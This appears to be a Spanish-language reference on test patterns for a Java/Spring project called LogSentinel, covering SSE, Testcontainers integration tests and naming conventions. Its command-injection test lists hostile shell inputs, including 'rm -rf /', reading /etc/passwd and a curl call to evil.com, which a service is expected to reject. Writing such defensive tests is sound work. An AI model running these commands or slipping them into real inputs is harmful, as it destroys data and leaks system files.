# Patrones Avanzados de Tests — LogSentinel

Referencia complementaria a `tdd-logsentinel/SKILL.md`.
Cubrea patrones de integración, SSE y seguridad que van más allá del ciclo
RED-GREEN-REFACTOR básico.

## Test de SSE Endpoint

```java
@Test
void should_return_event_stream_content_type() throws Exception {
    mockMvc.perform(get("/api/v1/incidents/{id}/stream", UUID.randomUUID()))
        .andExpect(status().isOk())
        .andExpect(header().string("Content-Type", containsString("text/event-stream")));
}
```

## Test de Integración con Testcontainers 2.x

```java
@SpringBootTest(webEnvironment = RANDOM_PORT)
@ActiveProfiles("test")
class {Name}IntegrationTest {

    // URL jdbc:tc:postgresql:16:///... arranca el container automáticamente
    // Definida en application-test.yml — NO necesita @Container explícito

    @MockBean ChatClient chatClient;         // NUNCA llamadas reales a OpenAI en CI
    @MockBean EmbeddingModel embeddingModel;

    @Autowired TestRestTemplate restTemplate;

    @Test
    void should_persist_incident_and_return_201() { ... }
}
```

## Test de Seguridad — RemediationService (command injection)

```java
@Test
void should_reject_script_with_shell_metacharacters() {
    var maliciousInputs = List.of(
        "echo ok; rm -rf /",
        "$(cat /etc/passwd)",
        "`id`",
        "script && curl http://evil.com"
    );
    for (var input : maliciousInputs) {
        assertThatThrownBy(() -> remediationService.execute(input))
            .isInstanceOf(InvalidRemediationScriptException.class);
    }
}
```

## Convenciones de Naming

- Unitarios: `{ClassName}Test.java`
- Integración: `{ClassName}IntegrationTest.java`
- Método: `should_{expected_behavior}_when_{condition}()`

## ⚠ Pitfall Testcontainers 2.x (Spring Boot 4.1.0)

Artifact IDs correctos en versión 2.x:

| ❌ Incorrecto (1.x) | ✅ Correcto (2.x) |
|---|---|
| `org.testcontainers:junit-jupiter` | `org.testcontainers:testcontainers-junit-jupiter` |
| `org.testcontainers:postgresql` | `org.testcontainers:testcontainers-postgresql` |

Las versiones son gestionadas por el BOM de Spring Boot 4 — NO agregar `<version>` explícita.
